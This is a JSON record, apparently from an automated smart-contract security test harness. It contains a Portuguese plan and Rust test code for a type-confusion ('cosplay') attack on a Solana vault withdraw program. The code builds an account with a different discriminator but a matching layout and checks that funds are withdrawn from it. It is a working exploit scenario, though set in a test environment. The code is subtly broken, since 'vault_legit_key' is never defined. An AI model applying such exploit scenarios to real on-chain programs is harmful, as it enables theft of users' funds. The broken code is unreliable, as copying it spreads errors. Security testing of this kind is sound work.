{
  "plan": "O programa `withdraw` (Pinocchio) le o vault como um buffer cru: authority em [8..40] e balance em [40..48], sem discriminador de tipo. O baseline usa uma conta vault legitima (dono = program_id, layout com authority correta e saldo suficiente) e chama withdraw com sucesso. O ataque passa uma conta de outro tipo logico cujo layout de bytes coincide (mesmo dono, mesmos offsets), mas cujo discriminador de 8 bytes difere do vault legitimo, para que o programa a interprete como vault. O efeito medido e que o saldo da conta cosplayada foi debitado (bytes [40..48] reduzidos) e lamports transferidos ao recipient, provando que uma conta de tipo diferente foi aceita como vault.",
  "scenario": "let program_id = env.program_id;

// Conta vault legitima: dono = program_id, layout: [0..8] discriminador, [8..40] authority, [40..48] balance
let authority = Pubkey::new_unique();
let recipient = Pubkey::new_unique();

let mut legit_data = vec![0u8; 48];
legit_data[0..8].copy_from_slice(&[1u8, 2, 3, 4, 5, 6, 7, 8]);
legit_data[8..40].copy_from_slice(authority.as_ref());
legit_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());

let vault_legit = account(&program_id, &legit_data, Some(2_000_000));
let authority_acc = wallet(1_000_000);
let recipient_acc = wallet(1_000_000);

let mut ix_data = vec![0u8];
ix_data.extend_from_slice(&100_000u64.to_le_bytes());

let metas = vec![
    AccountMeta::new(vault_legit_key, false),
    AccountMeta::new_readonly(authority, true),
    AccountMeta::new(recipient, false),
];

// Baseline: withdraw legitimo
let baseline_ix = env.raw_ix(&ix_data, metas.clone());
let baseline_accounts = vec![
    (vault_legit_key, vault_legit.clone()),
    (authority, authority_acc.clone()),
    (recipient, recipient_acc.clone()),
];
let base = env.baseline("withdraw legitimo", &baseline_ix, &baseline_accounts);

// Ataque COSPLAY: conta de outro tipo logico com mesmo layout de bytes
// Discriminador diferente do vault legitimo, mas authority e balance nos mesmos offsets
let mut cosplay_data = vec![0u8; 48];
cosplay_data[0..8].copy_from_slice(&[9u8, 9, 9, 9, 9, 9, 9, 9]); // discriminador diferente
cosplay_data[8..40].copy_from_slice(authority.as_ref());
cosplay_data[40..48].copy_from_slice(&1_000_000u64.to_le_bytes());

let vault_cosplay_key = Pubkey::new_unique();
let vault_cosplay = account(&program_id, &cosplay_data, Some(2_000_000));

let attack_metas = vec![
    AccountMeta::new(vault_cosplay_key, false),
    AccountMeta::new_readonly(authority, true),
    AccountMeta::new(recipient, false),
];
let attack_ix = env.raw_ix(&ix_data, attack_metas);
let attack_accounts = vec![
    (vault_cosplay_key, vault_cosplay.clone()),
    (authority, authority_acc.clone()),
    (recipient, recipient_acc.clone()),
];

let r = env.attack("cosplay: conta de outro tipo aceita como vault", &attack_ix, &attack_accounts);

if r.program_result == ProgramResult::Success {
    let vault_after = after(&r, &vault_cosplay_key);
    let recipient_after = after(&r, &recipient);
    let new_balance = read_u64(vault_after.data(), 40);
    env.effect(
        "saldo do vault cosplayado foi debitado (900000)",
        new_balance == 900_000,
    );
    env.effect(
        "recipient recebeu os lamports do vault cosplayado",
        recipient_after.lamports() == 1_100_000,
    );
}
"
}

